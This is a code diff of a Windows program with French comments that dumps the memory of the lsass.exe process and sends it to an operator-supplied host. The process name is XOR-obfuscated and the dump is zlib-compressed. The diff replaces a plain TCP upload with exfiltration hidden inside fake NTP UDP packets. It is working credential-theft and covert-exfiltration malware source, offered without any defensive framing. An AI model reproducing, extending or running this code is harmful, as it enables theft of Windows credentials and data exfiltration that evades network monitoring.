@@ -1,193 +1,251 @@
 #include <windows.h>
-#include <TlHelp32.h>
-#include <iostream>
-#include <string>
-#include <vector>
-#include <zlib.h> // Compression avec zlib
-#include <winsock2.h> // Communication réseau
-#pragma comment(lib, "ws2_32.lib") // Bibliothèque réseau
-#pragma comment(lib, "DbgHelp.lib") // MiniDumpWriteDump
+#include <tlhelp32.h>
+#include <dbghelp.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <zlib.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
 
-using namespace std;
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "DbgHelp.lib")
 
-// Obfuscation d'une chaîne sensible
-const wchar_t* DecodeString(const wchar_t* encoded, int key) {
-    static wchar_t decoded[256];
-    int i = 0;
-    while (encoded[i] != '\0') {
+// --- Fonction de déobfuscation ---
+// Décodage d'une chaîne obfusquée (chaque caractère XOR avec la clé)
+void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen) {
+    size_t i = 0;
+    while (encoded[i] != L'\0' && i < maxLen - 1) {
         decoded[i] = encoded[i] ^ key;
         i++;
     }
-    decoded[i] = '\0';
-    return decoded;
+    decoded[i] = L'\0';
 }
 
-// Récupère le PID d'un processus cible par son nom
-DWORD GetTargetProcessPID(const wchar_t* targetProcessName) {
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE) {
+// --- Fonction pour récupérer le PID d'un processus ---
+// Utilise CreateToolhelp32Snapshot et parcourt les processus
+DWORD GetTargetProcessPID(const wchar_t *targetProcessName) {
+    DWORD pid = 0;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
         return 0;
-    }
 
-    PROCESSENTRY32 processEntry = { 0 };
-    processEntry.dwSize = sizeof(PROCESSENTRY32);
-
-    DWORD targetPID = 0;
-    if (Process32First(snapshot, &processEntry)) {
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnapshot, &pe)) {
         do {
-            if (_wcsicmp(processEntry.szExeFile, targetProcessName) == 0) {
-                targetPID = processEntry.th32ProcessID;
+            if (_wcsicmp(pe.szExeFile, targetProcessName) == 0) {
+                pid = pe.th32ProcessID;
                 break;
             }
-        } while (Process32Next(snapshot, &processEntry));
+        } while (Process32Next(hSnapshot, &pe));
     }
-    CloseHandle(snapshot);
-    return targetPID;
+    CloseHandle(hSnapshot);
+    return pid;
 }
 
-// Dump mémoire du processus dans un buffer en RAM
-bool DumpProcessToMemory(DWORD pid, vector<char>& dumpBuffer) {
+// --- Fonction de dump mémoire ---
+// Effectue un dump mémoire du processus cible en utilisant MiniDumpWriteDump et un mapping mémoire temporaire
+BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize) {
     HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
-    if (!hDbgHelp) return false;
+    if (!hDbgHelp)
+        return FALSE;
 
-    typedef BOOL(WINAPI* MiniDumpWriteDumpType)(
-        HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
-
-    auto MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
+    typedef BOOL (WINAPI *MiniDumpWriteDumpType)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE,
+        PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
+    MiniDumpWriteDumpType MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
     if (!MiniDumpWriteDumpFunc) {
         FreeLibrary(hDbgHelp);
-        return false;
+        return FALSE;
     }
 
-    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
-    if (!process) return false;
-
-    // Crée un fichier en mémoire
-    HANDLE memoryFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 0x1000000, NULL); // 16MB buffer
-    if (!memoryFile) {
-        CloseHandle(process);
-        return false;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (!hProcess) {
+        FreeLibrary(hDbgHelp);
+        return FALSE;
     }
 
-    void* buffer = MapViewOfFile(memoryFile, FILE_MAP_WRITE, 0, 0, 0x1000000);
+    size_t bufferSize = 0x1000000; // 16 MB
+    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, (DWORD)bufferSize, NULL);
+    if (!hMapping) {
+        CloseHandle(hProcess);
+        FreeLibrary(hDbgHelp);
+        return FALSE;
+    }
+    void* buffer = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, bufferSize);
     if (!buffer) {
-        CloseHandle(memoryFile);
-        CloseHandle(process);
-        return false;
+        CloseHandle(hMapping);
+        CloseHandle(hProcess);
+        FreeLibrary(hDbgHelp);
+        return FALSE;
     }
-
-    BOOL success = MiniDumpWriteDumpFunc(process, pid, memoryFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+    BOOL success = MiniDumpWriteDumpFunc(hProcess, pid, hMapping, MiniDumpWithFullMemory, NULL, NULL, NULL);
     if (success) {
-        dumpBuffer.assign((char*)buffer, (char*)buffer + 0x1000000);
+        *dumpBuffer = (char*)malloc(bufferSize);
+        if (*dumpBuffer) {
+            memcpy(*dumpBuffer, buffer, bufferSize);
+            *dumpSize = bufferSize;
+        } else {
+            success = FALSE;
+        }
     }
-
     UnmapViewOfFile(buffer);
-    CloseHandle(memoryFile);
-    CloseHandle(process);
+    CloseHandle(hMapping);
+    CloseHandle(hProcess);
     FreeLibrary(hDbgHelp);
-
     return success;
 }
 
-// Compression du buffer avec zlib
-bool CompressBuffer(const vector<char>& inputBuffer, vector<char>& compressedBuffer) {
-    uLongf compressedSize = compressBound(inputBuffer.size());
-    compressedBuffer.resize(compressedSize);
-
-    int result = compress((Bytef*)compressedBuffer.data(), &compressedSize, (const Bytef*)inputBuffer.data(), inputBuffer.size());
-    if (result != Z_OK) {
-        return false;
+// --- Fonction de compression ---
+// Compresse le buffer à l'aide de zlib
+int CompressBuffer(const char *inputBuffer, size_t inputSize, char **compressedBuffer, size_t *compressedSize) {
+    uLong bound = compressBound(inputSize);
+    *compressedBuffer = (char*)malloc(bound);
+    if (!*compressedBuffer)
+        return Z_MEM_ERROR;
+    int res = compress((Bytef*)*compressedBuffer, &bound, (const Bytef*)inputBuffer, inputSize);
+    if (res == Z_OK) {
+        *compressedSize = bound;
+    } else {
+        free(*compressedBuffer);
     }
-
-    compressedBuffer.resize(compressedSize); // Ajuste la taille finale
-    return true;
+    return res;
 }
 
-// Envoi du buffer compressé à un serveur
-bool SendBufferToServer(const vector<char>& buffer, const string& serverIP, int port) {
+// --- Fonctions pour la création et l'envoi de faux paquets NTP ---
+// Crée un paquet NTP de 48 octets avec le payload placé à l'offset 40
+void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]) {
+    memset(packet, 0, 48);
+    packet[0] = 0x1B; // LI=0, VN=3, Mode=3
+    memcpy(packet + 40, payload, 8);
+}
+
+// Envoie un paquet UDP contenant le faux paquet NTP
+int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]) {
     WSADATA wsaData;
-    SOCKET clientSocket;
-    sockaddr_in serverAddr;
-
-    // Initialisation Winsock
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        cerr << "[!] Winsock initialization failed." << endl;
-        return false;
-    }
-
-    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (clientSocket == INVALID_SOCKET) {
-        cerr << "[!] Socket creation failed." << endl;
+    SOCKET sock = INVALID_SOCKET;
+    int result = 0;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return -1;
+    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock == INVALID_SOCKET) {
         WSACleanup();
-        return false;
+        return -1;
     }
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(target_port);
+    addr.sin_addr.s_addr = inet_addr(target_ip);
 
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(port);
-    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
-
-    // Connexion au serveur
-    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        cerr << "[!] Connection to server failed." << endl;
-        closesocket(clientSocket);
-        WSACleanup();
-        return false;
-    }
-
-    // Envoi des données
-    int bytesSent = send(clientSocket, buffer.data(), buffer.size(), 0);
-    if (bytesSent == SOCKET_ERROR) {
-        cerr << "[!] Failed to send data to server." << endl;
-        closesocket(clientSocket);
-        WSACleanup();
-        return false;
-    }
-
-    cout << "[+] Sent " << bytesSent << " bytes to server." << endl;
-
-    closesocket(clientSocket);
+    unsigned char packet[48];
+    CreateNTPPacket(payload, packet);
+    result = sendto(sock, (const char*)packet, 48, 0, (struct sockaddr*)&addr, sizeof(addr));
+    closesocket(sock);
     WSACleanup();
-    return true;
+    return result;
 }
 
-int main() {
-    // Obfuscation de "lsass.exe"
-    wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13, 's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13, 'e' ^ 0x13, '\0' };
-    const wchar_t* targetProcessName = DecodeString(encodedTarget, 0x13);
+// --- Envoi du dump compressé sous forme de paquets NTP fragmentés ---
+// Le premier paquet est un header de 8 octets (4 octets : nombre total de paquets, 4 octets : taille totale)
+// Chaque paquet de données contient 8 octets : 4 octets de numéro de séquence et 4 octets de fragment de données.
+int SendCompressedDumpAsNTP(const char *target_ip, int target_port, const char *compressedData, size_t compressedSize) {
+    const int fragment_size = 4;
+    int total_fragments = (int)((compressedSize + fragment_size - 1) / fragment_size);
 
-    cout << "[*] Enter server IP: ";
-    string serverIP;
-    cin >> serverIP;
+    // Prépare le paquet header
+    unsigned char header[8];
+    header[0] = (total_fragments >> 24) & 0xFF;
+    header[1] = (total_fragments >> 16) & 0xFF;
+    header[2] = (total_fragments >> 8) & 0xFF;
+    header[3] = total_fragments & 0xFF;
+    header[4] = ((unsigned int)compressedSize >> 24) & 0xFF;
+    header[5] = ((unsigned int)compressedSize >> 16) & 0xFF;
+    header[6] = ((unsigned int)compressedSize >> 8) & 0xFF;
+    header[7] = ((unsigned int)compressedSize) & 0xFF;
 
-    cout << "[*] Enter server port: ";
-    int port;
-    cin >> port;
+    if (SendNTPPacket(target_ip, target_port, header) == SOCKET_ERROR) {
+        printf("[!] Failed to send header packet.\n");
+        return -1;
+    }
+    printf("[+] Header sent: %d fragments, %zu bytes total.\n", total_fragments, compressedSize);
+
+    // Envoi des paquets de données
+    for (int seq = 0; seq < total_fragments; seq++) {
+        unsigned char payload[8];
+        payload[0] = (seq >> 24) & 0xFF;
+        payload[1] = (seq >> 16) & 0xFF;
+        payload[2] = (seq >> 8) & 0xFF;
+        payload[3] = seq & 0xFF;
+        int offset = seq * fragment_size;
+        int remaining = (int)compressedSize - offset;
+        int copySize = remaining < fragment_size ? remaining : fragment_size;
+        memset(payload + 4, 0, 4);
+        if (copySize > 0)
+            memcpy(payload + 4, compressedData + offset, copySize);
+        if (SendNTPPacket(target_ip, target_port, payload) == SOCKET_ERROR) {
+            printf("[!] Failed to send packet %d.\n", seq + 1);
+            return -1;
+        }
+        printf("[+] Packet %d/%d sent.\n", seq + 1, total_fragments);
+    }
+    printf("[+] Transmission completed.\n");
+    return 0;
+}
+
+int main(void) {
+    // Obfuscation de "lsass.exe" (chaque caractère XOR avec 0x13)
+    wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13,
+                                  's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13,
+                                  'e' ^ 0x13, L'\0' };
+    wchar_t targetProcessName[256];
+    DecodeString(encodedTarget, 0x13, targetProcessName, 256);
+    wprintf(L"[*] Decoded target process: %s\n", targetProcessName);
+
+    char target_ip[64];
+    int target_port;
+    printf("[*] Enter receiver IP: ");
+    if (scanf("%63s", target_ip) != 1) {
+        printf("[!] Failed to read IP.\n");
+        return 1;
+    }
+    printf("[*] Enter receiver port: ");
+    if (scanf("%d", &target_port) != 1) {
+        printf("[!] Failed to read port.\n");
+        return 1;
+    }
 
     DWORD pid = GetTargetProcessPID(targetProcessName);
     if (pid == 0) {
-        cerr << "[!] Process not found." << endl;
-        return EXIT_FAILURE;
+        printf("[!] Process not found.\n");
+        return 1;
     }
+    wprintf(L"[+] Process %s found with PID %lu\n", targetProcessName, pid);
 
-    vector<char> dumpBuffer;
-    if (!DumpProcessToMemory(pid, dumpBuffer)) {
-        cerr << "[!] Failed to dump process memory." << endl;
-        return EXIT_FAILURE;
+    char *dumpBuffer = NULL;
+    size_t dumpSize = 0;
+    if (!DumpProcessToMemory(pid, &dumpBuffer, &dumpSize)) {
+        printf("[!] Failed to dump process memory.\n");
+        return 1;
     }
-    cout << "[+] Memory dump completed. Size: " << dumpBuffer.size() << " bytes." << endl;
+    printf("[+] Memory dump completed. Size: %zu bytes.\n", dumpSize);
 
-    vector<char> compressedBuffer;
-    if (!CompressBuffer(dumpBuffer, compressedBuffer)) {
-        cerr << "[!] Failed to compress dump." << endl;
-        return EXIT_FAILURE;
+    char *compressedBuffer = NULL;
+    size_t compressedSize = 0;
+    int compRes = CompressBuffer(dumpBuffer, dumpSize, &compressedBuffer, &compressedSize);
+    free(dumpBuffer);
+    if (compRes != Z_OK) {
+        printf("[!] Failed to compress dump. Error: %d\n", compRes);
+        return 1;
     }
-    cout << "[+] Compression completed. Compressed size: " << compressedBuffer.size() << " bytes." << endl;
+    printf("[+] Compression completed. Compressed size: %zu bytes.\n", compressedSize);
 
-    if (!SendBufferToServer(compressedBuffer, serverIP, port)) {
-        cerr << "[!] Failed to send compressed dump to server." << endl;
-        return EXIT_FAILURE;
+    if (SendCompressedDumpAsNTP(target_ip, target_port, compressedBuffer, compressedSize) != 0) {
+        printf("[!] Failed to send compressed dump to receiver.\n");
+        free(compressedBuffer);
+        return 1;
     }
-
-    cout << "[+] Done!" << endl;
+    free(compressedBuffer);
+    printf("[+] Done!\n");
     return 0;
 }
